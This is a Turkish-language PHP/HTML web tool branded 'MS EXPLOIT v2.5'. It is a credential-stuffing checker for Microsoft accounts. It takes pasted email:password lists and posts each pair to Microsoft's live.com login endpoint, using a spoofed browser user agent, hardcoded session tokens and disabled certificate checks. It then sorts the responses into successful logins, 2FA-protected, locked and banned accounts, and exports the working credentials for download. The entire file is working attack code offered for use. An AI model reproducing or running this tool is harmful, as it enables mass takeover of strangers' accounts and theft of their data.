<?php
session_start();
// Giriş kontrolü istersen burayı aktif edebilirsin
// if (!isset($_SESSION['user_id'])) { header('Location: login.php'); exit; }

if (isset($_GET['action']) && $_GET['action'] == 'check') {
    header('Content-Type: application/json');
    error_reporting(0);
    
    $user = trim($_POST['user'] ?? '');
    $pass = trim($_POST['pass'] ?? '');

    if (empty($user) || empty($pass)) {
        echo json_encode(['status' => 'fail', 'user' => $user]);
        exit;
    }


    $url = "https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username=".urlencode($user)."&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216";

    $postFields = "ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=-Div0Bt28gmyaHIfgDZtd5xvxnb7eeDAQOIjXkqyoF1ekQB6gLEqbSdzNE05qpz*B1Q82VKHs*RNXPa8xZG1TJS5HGKjFMxGcQ51PMU77ulAR%21JjAUTPM*Am5lkZU6Sa%21wIdI6zYnUI8VYQHQOCJLb*lRsaiV5MhGQieznZ%21EynMuuBHbBfLr28btqCBqLhzZXQ%24%24&PPSX=Pa&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1&login=".urlencode($user)."&loginfmt=".urlencode($user)."&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=".urlencode($pass);

    $headers = [
        "Origin: https://login.live.com",
        "Content-Type: application/x-www-form-urlencoded",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer: https://login.live.com/",
        "Cookie: MSPRequ=id=N&lt=1716447264&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=\$uuid-13a3c70b-5026-45a1-84df-99ba880a29e1"
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);

    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    $header_content = substr($response, 0, $info['header_size']);
    $body_content = substr($response, $info['header_size']);
    $redirect_url = $info['redirect_url'];
    curl_close($ch);

    // Durum Belirleme
    if (strpos($header_content, "ANON") !== false || strpos($header_content, "WLSSC") !== false || strpos($redirect_url, "oauth20_desktop.srf") !== false) {
        $status = 'success'; $plan = 'HİT (Giriş Yapıldı)';
    } elseif (strpos($body_content, "account.live.com/recover") !== false || strpos($redirect_url, "recover?mkt") !== false || strpos($body_content, "identity/confirm") !== false) {
        $status = '2factor'; $plan = '2FA (Onay Gerekiyor)';
    } elseif (strpos($body_content, "/Abuse?mkt=") !== false || strpos($redirect_url, "/Abuse?mkt=") !== false || strpos($body_content, "/cancel?mkt=") !== false) {
        $status = 'custom'; $plan = 'CUSTOM (Kilitli/Kısıtlı)';
    } elseif (strpos($body_content, ",AC:null,urlFedConvertRename") !== false) {
        $status = 'ban'; $plan = 'BAN (Sistem Engeli)';
    } else {
        $status = 'fail'; $plan = 'FAILURE';
    }

    echo json_encode([
        'status' => $status,
        'user' => $user,
        'pass' => $pass,
        'plan' => $plan,
        'info' => "IP: " . $_SERVER['REMOTE_ADDR'] . " | Status: " . strtoupper($status)
    ]);
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>MICROSOFT CHECKER | CYBER EXPLOIT</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { background-color: #030508; color: #e2e8f0; font-family: 'Inter', sans-serif; overflow-x: hidden; }
        .neon-blue { box-shadow: 0 0 15px rgba(59, 130, 246, 0.15); border: 1px solid rgba(59, 130, 246, 0.3); }
        .neon-green { box-shadow: 0 0 15px rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.3); }
        .neon-red { box-shadow: 0 0 15px rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); }
        .neon-yellow { box-shadow: 0 0 15px rgba(245, 158, 11, 0.15); border: 1px solid rgba(245, 158, 11, 0.3); }
        .main-card { background: rgba(15, 18, 26, 0.9); backdrop-filter: blur(10px); border-radius: 16px; border: 1px solid rgba(255,255,255,0.05); }
        .input-area { background: #0a0c12; border: 1px solid #1f2937; border-radius: 12px; color: #60a5fa; font-family: 'Consolas', monospace; outline: none; }
        .hit-box { background: linear-gradient(145deg, #0f121a, #0a0c12); border-left: 4px solid #10b981; border-radius: 12px; }
        .animate-fade { animation: fadeInUp 0.4s ease forwards; }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="p-4 md:p-8">

    <div class="max-w-[1500px] mx-auto flex justify-between items-center mb-8 animate-fade">
        <div class="flex items-center gap-3">
            <div class="w-11 h-11 bg-blue-600 rounded-lg flex items-center justify-center shadow-lg shadow-blue-600/30">
                <i class="fab fa-microsoft text-white text-xl"></i>
            </div>
            <h1 class="text-2xl font-black tracking-tighter italic" style="font-family: 'Syncopate', sans-serif;">
                MS<span class="text-blue-500">EXPLOIT</span><span class="text-gray-600 text-xs ml-2">v2.5</span>
            </h1>
        </div>
        <div class="flex gap-2">
             <a href="index.php" class="bg-white/5 border border-white/10 hover:bg-blue-600 hover:text-white px-5 py-2.5 rounded-xl text-[11px] font-black uppercase tracking-widest transition-all flex items-center gap-2">
                <i class="fas fa-arrow-left"></i> Geri Dön
            </a>
        </div>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-2 md:grid-cols-4 gap-5 mb-8 animate-fade">
        <div class="main-card p-6 neon-blue">
            <span class="text-gray-500 text-[10px] font-black uppercase tracking-widest block mb-1">Kalan</span>
            <div class="text-3xl font-black" id="kalan_val">0</div>
        </div>
        <div class="main-card p-6 neon-green">
            <span class="text-green-500 text-[10px] font-black uppercase tracking-widest block mb-1">Hit</span>
            <div class="text-3xl font-black text-green-500" id="hit_count">0</div>
        </div>
        <div class="main-card p-6 neon-yellow">
            <span class="text-yellow-500 text-[10px] font-black uppercase tracking-widest block mb-1">2FA / Custom</span>
            <div class="text-3xl font-black text-yellow-500" id="custom_count">0</div>
        </div>
        <div class="main-card p-6 neon-red">
            <span class="text-red-500 text-[10px] font-black uppercase tracking-widest block mb-1">Fail</span>
            <div class="text-3xl font-black text-red-500" id="fail_count">0</div>
        </div>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-1 lg:grid-cols-12 gap-8">
        <div class="lg:col-span-4 space-y-5 animate-fade">
            <div class="main-card p-6">
                <div class="flex items-center gap-3 mb-4 border-b border-white/5 pb-3">
                    <i class="fas fa-database text-blue-500"></i>
                    <h2 class="text-lg font-black uppercase tracking-tighter">Hesap Listesi</h2>
                </div>
                <textarea id="accs" class="input-area h-[350px] p-4 text-xs w-full" placeholder="mail:pass"></textarea>
                <button id="btn" onclick="startCheck()" class="w-full mt-5 py-4 bg-blue-600 rounded-xl text-white font-black uppercase tracking-widest hover:bg-blue-700 transition-all text-sm">
                    Taramayı Başlat
                </button>
            </div>
        </div>

        <div class="lg:col-span-8 animate-fade">
            <div class="flex justify-between items-end mb-4">
                <h2 class="text-xl font-black uppercase tracking-tighter"><i class="fas fa-terminal text-green-500 mr-2"></i> Log Çıktısı</h2>
                <button onclick="downloadHits()" class="bg-green-600 px-6 py-3 rounded-xl text-xs font-black uppercase tracking-widest flex items-center gap-2 hover:bg-green-700 transition-all">
                    <i class="fas fa-download"></i> Sonuçları İndir
                </button>
            </div>
            <div class="main-card p-6 h-[600px] overflow-y-auto space-y-4" id="hitLog">
                <div class="flex flex-col items-center justify-center h-full opacity-10 italic">
                    <i class="fas fa-shield-virus text-7xl mb-4"></i>
                    <p class="font-black uppercase tracking-[0.3em]">Sistem hazır, data bekleniyor...</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        let running = false;
        let hits = 0; let fails = 0; let customs = 0;
        let hitResults = [];

        async function startCheck() {
            const list = document.getElementById('accs').value.split('\n').filter(l => l.includes(':'));
            if(!list.length) return alert("Liste boş!");

            running = true;
            const btn = document.getElementById('btn');
            btn.innerText = "DURDUR";
            btn.classList.replace('bg-blue-600', 'bg-red-600');
            document.getElementById('kalan_val').innerText = list.length;

            for(let line of list) {
                if(!running) break;
                const parts = line.trim().split(':');
                if(parts.length < 2) continue;
                
                try {
                    const fd = new FormData(); 
                    fd.append('user', parts[0]); 
                    fd.append('pass', parts[1]);
                    const resp = await fetch('?action=check', { method: 'POST', body: fd });
                    const res = await resp.json();

                    if(res.status === 'success') {
                        hits++;
                        document.getElementById('hit_count').innerText = hits;
                        hitResults.push(`${res.user}:${res.pass} | SUCCESS`);
                        addLog(res, 'green');
                    } else if(res.status === '2factor' || res.status === 'custom') {
                        customs++;
                        document.getElementById('custom_count').innerText = customs;
                        hitResults.push(`${res.user}:${res.pass} | ${res.status.toUpperCase()}`);
                        addLog(res, 'yellow');
                    } else {
                        fails++;
                        document.getElementById('fail_count').innerText = fails;
                    }
                } catch(e) { 
                    fails++;
                    document.getElementById('fail_count').innerText = fails;
                }
                document.getElementById('kalan_val').innerText = parseInt(document.getElementById('kalan_val').innerText) - 1;
            }
            running = false;
            btn.innerText = "TARAMAYI BAŞLAT";
            btn.classList.replace('bg-red-600', 'bg-blue-600');
        }

        function addLog(res, color) {
            const log = document.getElementById('hitLog');
            if(hits + customs === 1) log.innerHTML = '';
            
            const borderCol = color === 'green' ? '#10b981' : '#f59e0b';
            const textCol = color === 'green' ? 'text-green-500' : 'text-yellow-500';

            const div = document.createElement('div');
            div.className = 'hit-box p-4 animate-fade mb-4';
            div.style.borderColor = borderCol;
            div.innerHTML = `
                <div class="flex justify-between items-center border-b border-white/5 pb-2 mb-2">
                    <div class="text-xs font-mono"><span class="text-blue-400 font-bold">${res.user}</span>:<span class="opacity-60">${res.pass}</span></div>
                    <div class="text-xs font-black ${textCol} uppercase">${res.plan}</div>
                </div>
                <div class="text-[9px] font-mono opacity-50 italic">
                    <i class="fas fa-info-circle mr-1"></i> ${res.info}
                </div>
            `;
            log.prepend(div);
        }

        function downloadHits() {
            if (!hitResults.length) return;
            const blob = new Blob([hitResults.join('\n')], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `MS_EXPLOIT_RESULTS.txt`;
            a.click();
        }
    </script>
</body>
</html>